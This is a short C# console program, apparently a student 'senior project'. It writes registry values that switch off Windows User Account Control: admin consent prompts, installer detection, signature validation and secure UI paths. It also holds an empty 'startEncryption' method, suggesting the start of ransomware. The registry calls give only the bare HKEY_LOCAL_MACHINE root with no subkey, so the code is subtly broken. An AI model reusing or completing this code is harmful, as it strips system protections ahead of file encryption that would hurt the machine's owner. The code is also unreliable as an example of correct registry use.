using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ConsoleApplication1
{
	class SeniorProjectStartup
	{
		static void Main(string[] args)
		{
			setRegistry();
		}

		private static void setRegistry()
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableUIADesktopToggle", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ConsentPromptBehaviorAdmin", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableInstallerDetection", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
		}

		protected void startEncryption()
		{
			
		}
	}
}
